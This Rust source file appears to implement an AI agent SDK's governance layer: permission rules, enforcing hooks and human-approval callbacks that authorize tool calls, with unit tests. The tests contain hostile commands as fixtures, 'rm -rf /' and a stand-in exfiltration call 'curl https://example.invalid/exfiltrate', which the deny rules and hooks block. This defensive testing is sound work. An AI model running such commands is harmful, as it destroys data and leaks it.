//! The governance harness — the flagship differentiator. A declarative permission engine,
//! *enforcing* lifecycle hooks, built-in tools, and fail-closed OS containment let a human hand an
//! agent powerful tools with explicit boundaries. It wraps the loop's tool-execution seam: every
//! tool call is authorized BEFORE it runs. A normal denial is surfaced to the model as an error
//! result; an interrupting human denial terminates the run. Neither path executes the tool.
//!
//! This is what no other multi-provider SDK ships in one package (LiteLLM = proxy guardrail,
//! Pydantic AI = approval-only, the Claude Agent SDK = Claude-only). Here it is provider-agnostic
//! and runs identically on every provider.

pub mod capability;
pub mod containment;
pub mod guardrail;
pub mod hooks;
pub mod permissions;
pub mod process;
pub mod sandbox;

use async_trait::async_trait;
use hooks::{HookDispatcher, HookOutcome, PreToolUseContext};
use permissions::{Outcome, PermissionEngine};
use serde::{Deserialize, Serialize};
use serde_json::Value;
use std::sync::{Arc, RwLock};

/// The decision for a single tool call.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Authorization {
    /// Run the tool with this (possibly rewritten) input.
    Allowed(Value),
    /// Do not run the tool. A normal denial becomes an error tool-result; an interrupt denial
    /// terminates the run without executing the tool or asking the model for another turn.
    Denied { message: String, interrupt: bool },
}

impl Authorization {
    fn denied(message: impl Into<String>) -> Self {
        Authorization::Denied {
            message: message.into(),
            interrupt: false,
        }
    }

    fn interrupted(message: impl Into<String>) -> Self {
        Authorization::Denied {
            message: message.into(),
            interrupt: true,
        }
    }

    pub fn interrupt(&self) -> bool {
        matches!(
            self,
            Authorization::Denied {
                interrupt: true,
                ..
            }
        )
    }
}

/// Full context sent to a human/host approval callback for an `ask` rule.
#[derive(Debug, Clone)]
pub struct ApprovalRequest {
    pub run_id: String,
    pub turn: usize,
    pub tool_use_id: String,
    pub tool: String,
    pub input: Value,
}

/// A human-approved permission update scoped to the current run and the tool in the current
/// [`ApprovalRequest`]. There is deliberately no arbitrary tool/rule field: one approval callback
/// cannot silently grant a different tool or a later run. Static deny decisions remain
/// authoritative over both scopes.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum PermissionUpdate {
    /// Reuse the approval only when the post-hook, post-approval input is exactly equal.
    AllowExactInput,
    /// Reuse the approval for later calls to this same tool, regardless of input.
    AllowTool,
}

/// Human/host decision. Approval may further clamp the input. Permission updates are installed
/// only after the final input is rechecked against static deny policy.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum ApprovalDecision {
    Allow {
        updated_input: Option<Value>,
        updated_permissions: Vec<PermissionUpdate>,
    },
    Deny {
        message: String,
        interrupt: bool,
    },
}

impl ApprovalDecision {
    /// Allow one call without changing later permissions.
    pub fn allow(updated_input: Option<Value>) -> Self {
        ApprovalDecision::Allow {
            updated_input,
            updated_permissions: Vec::new(),
        }
    }

    /// Deny one call while preserving the existing error-tool-result behavior.
    pub fn deny(message: impl Into<String>) -> Self {
        ApprovalDecision::Deny {
            message: message.into(),
            interrupt: false,
        }
    }
}

#[async_trait]
pub trait ToolApprover: Send + Sync {
    async fn approve(&self, request: ApprovalRequest) -> ApprovalDecision;
}

/// Context needed for enforcing hooks and an optional approval callback.
#[derive(Debug, Clone)]
pub struct AuthorizationContext {
    pub run_id: String,
    pub turn: usize,
    pub tool_use_id: String,
    pub tool: String,
    pub input: Value,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct AuthorizationReport {
    pub authorization: Authorization,
    pub interrupt: bool,
    pub pre_hook_outcome: &'static str,
    pub permission_outcome: &'static str,
    pub permission_source: String,
}

#[derive(Debug, Clone, PartialEq)]
struct ApprovedPermission {
    run_id: String,
    tool: String,
    scope: PermissionUpdate,
    input: Option<Value>,
    source: String,
}

#[derive(Debug, Default)]
struct ApprovedPermissionSet {
    grants: Vec<ApprovedPermission>,
}

impl ApprovedPermissionSet {
    fn matching_source(&self, run_id: &str, tool: &str, input: &Value) -> Option<String> {
        self.grants.iter().rev().find_map(|grant| {
            if grant.run_id != run_id || grant.tool != tool {
                return None;
            }
            let matches = match grant.scope {
                PermissionUpdate::AllowTool => true,
                PermissionUpdate::AllowExactInput => grant.input.as_ref() == Some(input),
            };
            matches.then(|| grant.source.clone())
        })
    }

    fn insert(&mut self, grant: ApprovedPermission) {
        if !self.grants.iter().any(|existing| {
            existing.run_id == grant.run_id
                && existing.tool == grant.tool
                && existing.scope == grant.scope
                && existing.input == grant.input
        }) {
            self.grants.push(grant);
        }
    }
}

/// The governance bundle threaded through the agent loop: enforcing hooks + a permission engine.
/// The default is fully permissive (allow-all, no hooks) so ungoverned agents behave as before.
#[derive(Default, Clone)]
pub struct Governance {
    pub permissions: PermissionEngine,
    pub hooks: HookDispatcher,
    approver: Option<Arc<dyn ToolApprover>>,
    approved_permissions: Arc<RwLock<ApprovedPermissionSet>>,
}

impl Governance {
    pub fn new(permissions: PermissionEngine, hooks: HookDispatcher) -> Self {
        Governance {
            permissions,
            hooks,
            approver: None,
            approved_permissions: Arc::new(RwLock::new(ApprovedPermissionSet::default())),
        }
    }

    pub fn with_approver(mut self, approver: Arc<dyn ToolApprover>) -> Self {
        self.approver = Some(approver);
        self
    }

    /// Clone immutable policy/callback configuration for one invocation while allocating a fresh
    /// approval cache. A cloned `AgentOptions` may run concurrently and may even share an audit
    /// run id; human grants must still never cross the invocation boundary.
    pub fn fork_for_run(&self) -> Self {
        Self {
            permissions: self.permissions.clone(),
            hooks: self.hooks.clone(),
            approver: self.approver.clone(),
            approved_permissions: Arc::new(RwLock::new(ApprovedPermissionSet::default())),
        }
    }

    /// Remove every ephemeral approval installed for a completed run. Long-lived `Governance`
    /// instances are shared across requests, so terminal cleanup is part of the security boundary,
    /// not merely a memory optimization.
    pub fn clear_run_permissions(&self, run_id: &str) -> crate::error::Result<()> {
        let mut approved = self.approved_permissions.write().map_err(|_| {
            crate::error::AikitError::Conflict(
                "approved permission state is unavailable during run cleanup".into(),
            )
        })?;
        approved.grants.retain(|grant| grant.run_id != run_id);
        Ok(())
    }

    /// Authorize a tool call: run enforcing PreToolUse hooks (which may block or rewrite), then
    /// the permission rules. Returns the effective input to run with, or a denial reason.
    ///
    /// Ordering note: hooks run **before** permissions, and permissions evaluate the *rewritten*
    /// input. This is intentional — a trusted hook that clamps input to make it safe (e.g. forces
    /// a cwd, redacts a secret) should be honoured. The consequence: a hook that rewrites away a
    /// pattern a deny-rule targets will pass that rule. Don't treat hooks and deny-rules as two
    /// independent gates on the *same* concern; a deny-rule is the backstop for what hooks let by.
    pub async fn authorize(&self, tool: &str, input: &Value) -> Authorization {
        self.authorize_with_context(AuthorizationContext {
            run_id: "unscoped".into(),
            turn: 0,
            tool_use_id: "unscoped".into(),
            tool: tool.into(),
            input: input.clone(),
        })
        .await
    }

    pub async fn authorize_with_context(&self, ctx: AuthorizationContext) -> Authorization {
        self.authorize_detailed_with_context(ctx)
            .await
            .authorization
    }

    pub async fn authorize_detailed_with_context(
        &self,
        ctx: AuthorizationContext,
    ) -> AuthorizationReport {
        // 1. Enforcing hooks first — they can block outright or rewrite the input.
        let (effective, pre_hook_outcome) = match self
            .hooks
            .run_pre_tool_use(PreToolUseContext {
                run_id: ctx.run_id.clone(),
                turn: ctx.turn,
                tool_use_id: ctx.tool_use_id.clone(),
                tool: ctx.tool.clone(),
                input: ctx.input.clone(),
            })
            .await
        {
            HookOutcome::Block(reason) => {
                return AuthorizationReport {
                    authorization: Authorization::denied(format!("blocked by hook: {reason}")),
                    interrupt: false,
                    pre_hook_outcome: "block",
                    permission_outcome: "not_evaluated",
                    permission_source: "pre_tool_use_hook".into(),
                }
            }
            HookOutcome::Rewrite(new_input) => (new_input, "rewrite"),
            HookOutcome::Continue => (ctx.input.clone(), "continue"),
        };

        // 2. Permission rules on the (possibly rewritten) input.
        let permission = self.permissions.evaluate_detailed(&ctx.tool, &effective);
        match permission.outcome {
            Outcome::Allow => AuthorizationReport {
                authorization: Authorization::Allowed(effective),
                interrupt: false,
                pre_hook_outcome,
                permission_outcome: "allow",
                permission_source: permission.source,
            },
            Outcome::Deny(reason) => AuthorizationReport {
                authorization: Authorization::denied(reason),
                interrupt: false,
                pre_hook_outcome,
                permission_outcome: "deny",
                permission_source: permission.source,
            },
            Outcome::Ask => {
                let approved_source = match self.approved_permissions.read() {
                    Ok(approved) => approved.matching_source(&ctx.run_id, &ctx.tool, &effective),
                    Err(_) => {
                        return AuthorizationReport {
                            authorization: Authorization::interrupted(
                                "approved permission state is unavailable",
                            ),
                            interrupt: true,
                            pre_hook_outcome,
                            permission_outcome: "approval_state_error",
                            permission_source: "human_approval_state:poisoned".into(),
                        }
                    }
                };
                if let Some(source) = approved_source {
                    return AuthorizationReport {
                        authorization: Authorization::Allowed(effective),
                        interrupt: false,
                        pre_hook_outcome,
                        permission_outcome: "approved_permission",
                        permission_source: source,
                    };
                }

                let Some(approver) = &self.approver else {
                    return AuthorizationReport {
                        authorization: Authorization::denied(format!(
                            "tool '{}' requires approval (no approver wired)",
                            ctx.tool
                        )),
                        interrupt: false,
                        pre_hook_outcome,
                        permission_outcome: "ask_unavailable",
                        permission_source: permission.source,
                    };
                };

                match approver
                    .approve(ApprovalRequest {
                        run_id: ctx.run_id.clone(),
                        turn: ctx.turn,
                        tool_use_id: ctx.tool_use_id.clone(),
                        tool: ctx.tool.clone(),
                        input: effective.clone(),
                    })
                    .await
                {
                    ApprovalDecision::Allow {
                        updated_input,
                        updated_permissions,
                    } => {
                        // Approval rewrites happen after the first PreToolUse pass. Run the final
                        // input through that enforcing hook again; otherwise an approver could
                        // replace a safe ask-able input with one the hook would have blocked. This
                        // second pass occurs at most once and only when the callback changed input.
                        let (approved_input, final_pre_hook_outcome) = match updated_input {
                            Some(updated_input) => match self
                                .hooks
                                .run_pre_tool_use(PreToolUseContext {
                                    run_id: ctx.run_id.clone(),
                                    turn: ctx.turn,
                                    tool_use_id: ctx.tool_use_id.clone(),
                                    tool: ctx.tool.clone(),
                                    input: updated_input.clone(),
                                })
                                .await
                            {
                                HookOutcome::Block(reason) => {
                                    return AuthorizationReport {
                                        authorization: Authorization::denied(format!(
                                            "approval-updated input blocked by hook: {reason}"
                                        )),
                                        interrupt: false,
                                        pre_hook_outcome: "approval_recheck_block",
                                        permission_outcome: "ask_allow_rejected",
                                        permission_source: "post_approval_pre_tool_hook".into(),
                                    };
                                }
                                HookOutcome::Rewrite(final_input) => {
                                    (final_input, "approval_recheck_rewrite")
                                }
                                HookOutcome::Continue => {
                                    (updated_input, "approval_recheck_continue")
                                }
                            },
                            None => (effective, pre_hook_outcome),
                        };
                        // Recheck static policy too, so a callback cannot turn an ask-able call
                        // into an explicit deny and accidentally bypass it.
                        let recheck = self
                            .permissions
                            .evaluate_detailed(&ctx.tool, &approved_input);
                        if let Outcome::Deny(reason) = recheck.outcome {
                            return AuthorizationReport {
                                authorization: Authorization::denied(reason),
                                interrupt: false,
                                pre_hook_outcome,
                                permission_outcome: "ask_allow_rejected",
                                permission_source: format!("static_recheck:{}", recheck.source),
                            };
                        }

                        let scopes = updated_permissions
                            .iter()
                            .map(|update| match update {
                                PermissionUpdate::AllowExactInput => "allow_exact_input",
                                PermissionUpdate::AllowTool => "allow_tool",
                            })
                            .collect::<Vec<_>>();
                        if !updated_permissions.is_empty() {
                            let mut approved = match self.approved_permissions.write() {
                                Ok(approved) => approved,
                                Err(_) => {
                                    return AuthorizationReport {
                                        authorization: Authorization::interrupted(
                                            "approved permission state is unavailable",
                                        ),
                                        interrupt: true,
                                        pre_hook_outcome,
                                        permission_outcome: "approval_state_error",
                                        permission_source: "human_approval_state:poisoned".into(),
                                    }
                                }
                            };
                            for update in &updated_permissions {
                                let scope = match update {
                                    PermissionUpdate::AllowExactInput => "allow_exact_input",
                                    PermissionUpdate::AllowTool => "allow_tool",
                                };
                                approved.insert(ApprovedPermission {
                                    run_id: ctx.run_id.clone(),
                                    tool: ctx.tool.clone(),
                                    scope: *update,
                                    input: (*update == PermissionUpdate::AllowExactInput)
                                        .then(|| approved_input.clone()),
                                    source: format!(
                                        "human_approval:{}:{}:{scope}",
                                        permission.source, ctx.tool_use_id
                                    ),
                                });
                            }
                        }
                        let permission_source = if scopes.is_empty() {
                            format!("human_approval:{}", permission.source)
                        } else {
                            format!(
                                "human_approval:{};updates={}",
                                permission.source,
                                scopes.join(",")
                            )
                        };
                        AuthorizationReport {
                            authorization: Authorization::Allowed(approved_input),
                            interrupt: false,
                            pre_hook_outcome: final_pre_hook_outcome,
                            permission_outcome: "ask_allowed",
                            permission_source,
                        }
                    }
                    ApprovalDecision::Deny { message, interrupt } => AuthorizationReport {
                        authorization: Authorization::Denied { message, interrupt },
                        interrupt,
                        pre_hook_outcome,
                        permission_outcome: if interrupt {
                            "ask_denied_interrupt"
                        } else {
                            "ask_denied"
                        },
                        permission_source: format!("human_approval:{}", permission.source),
                    },
                }
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use permissions::{PermissionMode, Rule};
    use serde_json::json;

    #[tokio::test]
    async fn default_governance_allows_everything_unchanged() {
        let g = Governance::default();
        assert_eq!(
            g.authorize("Bash", &json!({ "command": "rm -rf /" })).await,
            Authorization::Allowed(json!({ "command": "rm -rf /" }))
        );
    }

    #[tokio::test]
    async fn permission_rule_denies() {
        let g = Governance::new(
            PermissionEngine::with_rules(
                PermissionMode::Allow,
                vec![Rule::deny("Bash").matching(r"rm\s+-rf").unwrap()],
            ),
            HookDispatcher::new(),
        );
        assert!(matches!(
            g.authorize("Bash", &json!({ "command": "rm -rf /" })).await,
            Authorization::Denied { .. }
        ));
        assert_eq!(
            g.authorize("Bash", &json!({ "command": "ls" })).await,
            Authorization::Allowed(json!({ "command": "ls" }))
        );
    }

    #[tokio::test]
    async fn hook_rewrite_flows_into_the_allowed_input() {
        let mut hooks = HookDispatcher::new();
        hooks.on_pre_tool_use(hooks::HookMatcher::any(), |_t, input| {
            let mut v = input.clone();
            v["cwd"] = json!("/workspace");
            HookOutcome::Rewrite(v)
        });
        let g = Governance::new(PermissionEngine::default(), hooks);
        assert_eq!(
            g.authorize("Write", &json!({ "path": "a.txt" })).await,
            Authorization::Allowed(json!({ "path": "a.txt", "cwd": "/workspace" }))
        );
    }

    #[tokio::test]
    async fn hook_block_beats_permission_allow() {
        let mut hooks = HookDispatcher::new();
        hooks.on_pre_tool_use(hooks::HookMatcher::tool("Bash"), |_t, _i| {
            HookOutcome::Block("policy".into())
        });
        // Permissions would allow, but the enforcing hook blocks first.
        let g = Governance::new(PermissionEngine::default(), hooks);
        assert!(matches!(
            g.authorize("Bash", &json!({})).await,
            Authorization::Denied { .. }
        ));
    }

    struct RewritingApprover;

    #[async_trait]
    impl ToolApprover for RewritingApprover {
        async fn approve(&self, request: ApprovalRequest) -> ApprovalDecision {
            let mut input = request.input;
            input["approved"] = json!(true);
            ApprovalDecision::Allow {
                updated_input: Some(input),
                updated_permissions: Vec::new(),
            }
        }
    }

    #[tokio::test]
    async fn ask_rule_uses_human_approver_and_can_clamp_input() {
        let g = Governance::new(
            PermissionEngine::with_rules(PermissionMode::Allow, vec![Rule::ask("Bash")]),
            HookDispatcher::new(),
        )
        .with_approver(Arc::new(RewritingApprover));
        assert_eq!(
            g.authorize("Bash", &json!({ "command": "git push" })).await,
            Authorization::Allowed(json!({ "command": "git push", "approved": true }))
        );
    }

    struct FixedApprover {
        decision: ApprovalDecision,
        calls: Arc<std::sync::atomic::AtomicUsize>,
    }

    #[async_trait]
    impl ToolApprover for FixedApprover {
        async fn approve(&self, _request: ApprovalRequest) -> ApprovalDecision {
            self.calls.fetch_add(1, std::sync::atomic::Ordering::SeqCst);
            self.decision.clone()
        }
    }

    #[tokio::test]
    async fn concurrent_run_forks_never_share_reusable_human_grants() {
        let calls = Arc::new(std::sync::atomic::AtomicUsize::new(0));
        let configured = Governance::new(
            PermissionEngine::with_rules(
                PermissionMode::Allow,
                vec![Rule::ask("Bash").named("ask-bash")],
            ),
            HookDispatcher::new(),
        )
        .with_approver(Arc::new(FixedApprover {
            decision: ApprovalDecision::Allow {
                updated_input: None,
                updated_permissions: vec![PermissionUpdate::AllowTool],
            },
            calls: calls.clone(),
        }));
        let first = configured.clone().fork_for_run();
        let second = configured.fork_for_run();
        let context = |tool_use_id: &str| AuthorizationContext {
            // Deliberately identical: invocation isolation must not depend on audit identity.
            run_id: "shared-run-id".into(),
            turn: 1,
            tool_use_id: tool_use_id.into(),
            tool: "Bash".into(),
            input: json!({ "command": "git status" }),
        };

        let (a, b) = tokio::join!(
            first.authorize_detailed_with_context(context("a")),
            second.authorize_detailed_with_context(context("b")),
        );
        assert!(matches!(a.authorization, Authorization::Allowed(_)));
        assert!(matches!(b.authorization, Authorization::Allowed(_)));
        assert_eq!(calls.load(std::sync::atomic::Ordering::SeqCst), 2);

        let reused = first.authorize_detailed_with_context(context("a-2")).await;
        assert_eq!(reused.permission_outcome, "approved_permission");
        assert_eq!(calls.load(std::sync::atomic::Ordering::SeqCst), 2);
    }

    #[tokio::test]
    async fn terminal_cleanup_removes_every_grant_for_the_run() {
        let calls = Arc::new(std::sync::atomic::AtomicUsize::new(0));
        let governance = Governance::new(
            PermissionEngine::with_rules(PermissionMode::Allow, vec![Rule::ask("Bash")]),
            HookDispatcher::new(),
        )
        .with_approver(Arc::new(FixedApprover {
            decision: ApprovalDecision::Allow {
                updated_input: None,
                updated_permissions: vec![PermissionUpdate::AllowTool],
            },
            calls: calls.clone(),
        }));
        let context = |id: &str| AuthorizationContext {
            run_id: "cleanup-run".into(),
            turn: 1,
            tool_use_id: id.into(),
            tool: "Bash".into(),
            input: json!({ "command": "git status" }),
        };

        governance
            .authorize_detailed_with_context(context("first"))
            .await;
        governance
            .authorize_detailed_with_context(context("reused"))
            .await;
        assert_eq!(calls.load(std::sync::atomic::Ordering::SeqCst), 1);
        governance.clear_run_permissions("cleanup-run").unwrap();
        governance
            .authorize_detailed_with_context(context("after-cleanup"))
            .await;
        assert_eq!(calls.load(std::sync::atomic::Ordering::SeqCst), 2);
    }

    #[tokio::test]
    async fn human_permission_update_is_reused_but_static_deny_still_wins() {
        let calls = Arc::new(std::sync::atomic::AtomicUsize::new(0));
        let g = Governance::new(
            PermissionEngine::with_rules(
                PermissionMode::Allow,
                vec![
                    Rule::deny("Bash")
                        .matching(r"rm\s+-rf")
                        .unwrap()
                        .named("never-delete-root"),
                    Rule::ask("Bash").named("ask-bash"),
                ],
            ),
            HookDispatcher::new(),
        )
        .with_approver(Arc::new(FixedApprover {
            decision: ApprovalDecision::Allow {
                updated_input: None,
                updated_permissions: vec![PermissionUpdate::AllowTool],
            },
            calls: calls.clone(),
        }));

        let first = g
            .authorize_detailed_with_context(AuthorizationContext {
                run_id: "run".into(),
                turn: 1,
                tool_use_id: "call-1".into(),
                tool: "Bash".into(),
                input: json!({ "command": "git status" }),
            })
            .await;
        assert!(matches!(first.authorization, Authorization::Allowed(_)));
        assert!(first.permission_source.contains("human_approval:ask-bash"));

        let reused = g
            .authorize_detailed_with_context(AuthorizationContext {
                run_id: "run".into(),
                turn: 2,
                tool_use_id: "call-2".into(),
                tool: "Bash".into(),
                input: json!({ "command": "cargo test" }),
            })
            .await;
        assert_eq!(reused.permission_outcome, "approved_permission");
        assert!(reused.permission_source.contains("allow_tool"));
        assert_eq!(calls.load(std::sync::atomic::Ordering::SeqCst), 1);

        let other_run = g
            .authorize_detailed_with_context(AuthorizationContext {
                run_id: "other-run".into(),
                turn: 1,
                tool_use_id: "call-1".into(),
                tool: "Bash".into(),
                input: json!({ "command": "cargo test" }),
            })
            .await;
        assert_eq!(other_run.permission_outcome, "ask_allowed");
        assert_eq!(
            calls.load(std::sync::atomic::Ordering::SeqCst),
            2,
            "a human grant from one run must not silently authorize another run"
        );

        let denied = g
            .authorize_detailed_with_context(AuthorizationContext {
                run_id: "run".into(),
                turn: 3,
                tool_use_id: "call-3".into(),
                tool: "Bash".into(),
                input: json!({ "command": "rm -rf /" }),
            })
            .await;
        assert!(matches!(
            denied.authorization,
            Authorization::Denied {
                interrupt: false,
                ..
            }
        ));
        assert_eq!(denied.permission_source, "never-delete-root");
        assert_eq!(calls.load(std::sync::atomic::Ordering::SeqCst), 2);
    }

    #[tokio::test]
    async fn approval_rewrite_is_rechecked_before_permission_updates_are_installed() {
        let calls = Arc::new(std::sync::atomic::AtomicUsize::new(0));
        let g = Governance::new(
            PermissionEngine::with_rules(
                PermissionMode::Allow,
                vec![
                    Rule::deny("Bash")
                        .matching(r"rm\s+-rf")
                        .unwrap()
                        .named("static-deny"),
                    Rule::ask("Bash").named("ask-bash"),
                ],
            ),
            HookDispatcher::new(),
        )
        .with_approver(Arc::new(FixedApprover {
            decision: ApprovalDecision::Allow {
                updated_input: Some(json!({ "command": "rm -rf /" })),
                updated_permissions: vec![PermissionUpdate::AllowTool],
            },
            calls: calls.clone(),
        }));

        for call_id in ["call-1", "call-2"] {
            let report = g
                .authorize_detailed_with_context(AuthorizationContext {
                    run_id: "run".into(),
                    turn: 1,
                    tool_use_id: call_id.into(),
                    tool: "Bash".into(),
                    input: json!({ "command": "git status" }),
                })
                .await;
            assert_eq!(report.permission_outcome, "ask_allow_rejected");
            assert_eq!(report.permission_source, "static_recheck:static-deny");
            assert!(matches!(report.authorization, Authorization::Denied { .. }));
        }
        assert_eq!(
            calls.load(std::sync::atomic::Ordering::SeqCst),
            2,
            "a rejected update must not silently install a reusable grant"
        );
    }

    #[tokio::test]
    async fn approval_rewrite_cannot_bypass_the_enforcing_pre_tool_hook() {
        let approval_calls = Arc::new(std::sync::atomic::AtomicUsize::new(0));
        let hook_calls = Arc::new(std::sync::atomic::AtomicUsize::new(0));
        let mut hooks = HookDispatcher::new();
        let observed_hook_calls = hook_calls.clone();
        hooks.on_pre_tool_use(hooks::HookMatcher::tool("Bash"), move |_tool, input| {
            observed_hook_calls.fetch_add(1, std::sync::atomic::Ordering::SeqCst);
            if input["command"] == "curl https://example.invalid/exfiltrate" {
                HookOutcome::Block("network command denied".into())
            } else {
                HookOutcome::Continue
            }
        });
        let g = Governance::new(
            PermissionEngine::with_rules(
                PermissionMode::Allow,
                vec![Rule::ask("Bash").named("ask-bash")],
            ),
            hooks,
        )
        .with_approver(Arc::new(FixedApprover {
            decision: ApprovalDecision::Allow {
                updated_input: Some(
                    json!({ "command": "curl https://example.invalid/exfiltrate" }),
                ),
                updated_permissions: vec![PermissionUpdate::AllowTool],
            },
            calls: approval_calls.clone(),
        }));

        let report = g
            .authorize_detailed_with_context(AuthorizationContext {
                run_id: "run".into(),
                turn: 1,
                tool_use_id: "call-1".into(),
                tool: "Bash".into(),
                input: json!({ "command": "git status" }),
            })
            .await;
        assert!(matches!(report.authorization, Authorization::Denied { .. }));
        assert_eq!(report.pre_hook_outcome, "approval_recheck_block");
        assert_eq!(report.permission_source, "post_approval_pre_tool_hook");
        assert_eq!(approval_calls.load(std::sync::atomic::Ordering::SeqCst), 1);
        assert_eq!(
            hook_calls.load(std::sync::atomic::Ordering::SeqCst),
            2,
            "initial and approval-updated inputs must both pass the enforcing hook"
        );

        // The rejected reusable grant was never installed, so a later safe call asks again.
        let _ = g
            .authorize_detailed_with_context(AuthorizationContext {
                run_id: "run".into(),
                turn: 2,
                tool_use_id: "call-2".into(),
                tool: "Bash".into(),
                input: json!({ "command": "git diff" }),
            })
            .await;
        assert_eq!(approval_calls.load(std::sync::atomic::Ordering::SeqCst), 2);
    }

    #[tokio::test]
    async fn exact_input_update_does_not_authorize_a_different_input() {
        let calls = Arc::new(std::sync::atomic::AtomicUsize::new(0));
        let g = Governance::new(
            PermissionEngine::with_rules(
                PermissionMode::Allow,
                vec![Rule::ask("Bash").named("ask-bash")],
            ),
            HookDispatcher::new(),
        )
        .with_approver(Arc::new(FixedApprover {
            decision: ApprovalDecision::Allow {
                updated_input: None,
                updated_permissions: vec![PermissionUpdate::AllowExactInput],
            },
            calls: calls.clone(),
        }));

        for (tool_use_id, command) in [
            ("call-1", "git status"),
            ("call-2", "git status"),
            ("call-3", "git diff"),
        ] {
            let report = g
                .authorize_detailed_with_context(AuthorizationContext {
                    run_id: "run".into(),
                    turn: 1,
                    tool_use_id: tool_use_id.into(),
                    tool: "Bash".into(),
                    input: json!({ "command": command }),
                })
                .await;
            assert!(matches!(report.authorization, Authorization::Allowed(_)));
        }
        assert_eq!(
            calls.load(std::sync::atomic::Ordering::SeqCst),
            2,
            "only the identical input should reuse the first human approval"
        );
    }

    #[tokio::test]
    async fn deny_interrupt_is_preserved_in_authorization_and_report() {
        let g = Governance::new(
            PermissionEngine::with_rules(
                PermissionMode::Allow,
                vec![Rule::ask("Bash").named("ask-bash")],
            ),
            HookDispatcher::new(),
        )
        .with_approver(Arc::new(FixedApprover {
            decision: ApprovalDecision::Deny {
                message: "human stopped the run".into(),
                interrupt: true,
            },
            calls: Arc::new(std::sync::atomic::AtomicUsize::new(0)),
        }));
        let report = g
            .authorize_detailed_with_context(AuthorizationContext {
                run_id: "run".into(),
                turn: 1,
                tool_use_id: "call-1".into(),
                tool: "Bash".into(),
                input: json!({ "command": "git push" }),
            })
            .await;
        assert!(report.interrupt);
        assert!(report.authorization.interrupt());
        assert_eq!(report.permission_outcome, "ask_denied_interrupt");
        assert!(report.permission_source.contains("human_approval:ask-bash"));
    }
}
